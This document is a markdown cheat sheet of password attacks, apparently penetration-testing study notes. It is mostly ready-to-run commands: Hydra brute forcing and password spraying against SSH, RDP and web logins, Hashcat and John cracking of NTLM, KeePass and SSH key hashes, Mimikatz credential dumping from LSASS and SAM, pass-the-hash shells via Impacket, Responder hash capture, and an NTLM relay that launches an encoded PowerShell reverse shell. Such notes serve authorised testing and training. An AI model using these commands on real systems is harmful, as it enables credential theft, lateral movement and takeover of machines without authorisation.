# Password attacks

Graphics card cracking: 
- https://openbenchmarking.org/test/pts/hashcat-1.0.0
- https://www.tomshardware.com/news/eight-rtx-4090s-can-break-passwords-in-under-an-hour

Check:
- https://scatteredsecrets.com/

## Hydra

On GitHub: https://github.com/vanhauser-thc/thc-hydra

### Wordlist

```
hydra -l user -P wordlist.txt -s PortVictim ssh://IpVictim
hydra -l user -P wordlist.txt rdp://IpVictim # default port is 3389
```

### Spraying

```
hydra -L userlist.txt -p "hackedpassword" rdp://IpVictim
```
Userlist on Kali: `/usr/share/wordlists/dirb/others/names.txt`

### Http

Check the source code to get the user and password field names:
```
hydra -P wordlist.txt $IpVictim http-post-form "/baseurl_like_index.html_or_php:user_form_field=admin:password_form_field=^PASS^:error message when password is wrong"
hydra -l user -P wordlist.txt http-get $IpVictim
```

## Hashcat

Benchmark: `-b`
Example of rule: https://hashcat.net/wiki/doku.php?id=rule_based_attack
```
: ---> do nothing
$1 ---> add '1' and the end
c $1 $2 $3 ---> capitalize, add '1', then '2', then '3' at the end
$ ---> append a whitespace
^ ---> prepend a whitespace
$1 c $! ---> append '1', then capitalize, then add '!' at the end
$2 c $! ---> append '2', then capitalize, then add '!' at the end
$1 $2 $3 c $! ---> append '1', then '2', then '3', then capitalize, then append '!'
```
Usage:
```
hashcat -r rulefile.rule wordlist.txt --stdout
hashcat -m 0 tocrackfile.txt wordlist.txt -r rulefile.rule --force # MD5 hash (-m 0), ignore GPU warnings (--force)

hastcat wordlist.txt -r rulelist.txt --stdout
hashcat wordlist.txt -j 'd' wordlist.txt --stdout > newwordlist.txt
hashcat -m 0 tocrack.txt -k 'u' newwordlist.txt --force
hashcat -m passman.mode passman.hash rockyou.txt -r rockyou-30000.rule --force
```
Common rules: `/usr/share/hashcat/rules/` (for rockyou: `rockyou-30000.rule`)

## JohnTheRipper

### Keepass cracking

Find the database on Windows: `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` \
Then upload it on Kali: https://github.com/ThomasBucaioni/pentools/blob/main/filetransfer/readme.md#powershell \
And crack it with JohnTheRipper:
```
keepass2john Database.kdbx > keepass_hashfile.txt
hashcat --help | grep -i keepass # mode number for KeePass: 13400
hashcat -m keepass_mode_number keepass_hashfile.txt /u/s/w/rockyou.txt -r /u/s/hashcat/rules/rockyou-30000.rule --force
```

### Ssh passphrase cracking

```
ssh2john id_rsa > ssh.hash
hashcat -h | grep -i "ssh"
hashcat -m ssh.hashcat.mode ssh.hash ssh.passwords -r ssh.rule --force
cp ssh.rule /etc/john/otherssh.rule
vim /etc/john/john.config
john --wordlist=ssh.passwords --rules=sshJohnRules ssh.hash
```

---

## Mimikatz

Password modules:
- extraction from [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service): `sekurlsa::logonpasswords`
- dump: `lsadump::sam` (lighter)

Access right needed:
- extraction: __SeDebugPrivilege__
- privilege escalation ("impersonation"): __SeImpersonatePrivilege__ (e.g. local administrators)

Commands:
```
mimikatz # privilege::debug # with SeDebugPrivilege access rights
mimikatz # token::elevate # with SeImpersonatePrivilege access rights
mimikatz # lsadump::sam # hash dump
```

## NTLM hash cracking

On Windows:
```
PS> Get-LocalUser
PS> c:\path\to\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```
Take the hashes back to Kali:
```
hashcat -h | grep -i ntlm # get the NTLM mode code: 1000
hashcat -m ntlm_mode_code user_hash.txt /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
```

## Pass NTLM

Tools to pass-the-hash:
- SMB enumeration and attack: 
    - `smbclient`
    - CrackMapExec: https://github.com/byt3bl33d3r/CrackMapExec
- get an _interactive shell_ with Impacket: https://github.com/fortra/impacket
    - [psexec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)
    - [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)

Steal the Administrator's hash or Workstation_1 and connect to a Samba share on Workstation_2 (if same password...):
```
kali$ smbclient \\\\IpVictim_Workstation_2\\someshare -U Administrator --pw-nt-hash adminhash # pass the local "Administrator" account hash on WS_1
    smb: \> get somepassfile.txt # in the Samba share, get files
```
Get an interactive shell, if same Administrator hash/password on both Workstation_1 and Workstation_2:
```
kali$ impacket-psexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim_Workstation_2 # nt authority\system
kali$ impacket-wmiexec -hashes 00000000000000000000000000000000:adminhash Administrator@IpVictim_Workstation_2 # host\administrator
```

## Net-NTLMv2

When taking control of a low privilege user (with/without password), Mimikatz can't extract hashes.
The [Responder](https://github.com/lgandx/Responder) can catch the hash from a connection request from this user to crack it (if password unknown).

On Kali, run the responder:
```
sudo responder -I ethX
```
On Windows, with the compromised user (unknown password), send a connection request to the responder to get the hash:
```
smb \\IpAtt\fakeshare
```
then crack the password with `hashcat`:
```
hashcat --help | grep -i ntlm
hashcat -m ntlm_v2_mode_code lowprivuser_hash.txt /u/s/w/rockyou.txt --force
```
Once we know the password, we can connect to other stations with this user. For example, until we find one where he/she is a local administrator an run Mimikatz.

## Relay Net-NTLMv2

If the Net-NTLMv2 password is too complex and can't be cracked, its hash can still be exploited to connect to other stations:
```
sudo impacket-ntlmrelayx --no-http-server -smb2support -t IpVictim_Workstation_2 -c "powershell -enc base64_reverse_shell_long_string"
```
From Workstation_1, the connection to Kali is relayed to Workstation_2, which accepts the Net-NTLMv2 hash for connection. \
If the low privilege user is a local administrator on Workstation_2, the SAM hashes can be dumped or passed with Mimikatz. \
Relaying the Net-NTLMv2 hash on Workstation_2 needs "User Access Control remote restrictions" to be disabled for low privilege users. If UAC remote restrictions is enabled, the Net-NTLMv2 relay attack still works with the local _Administrator_ account


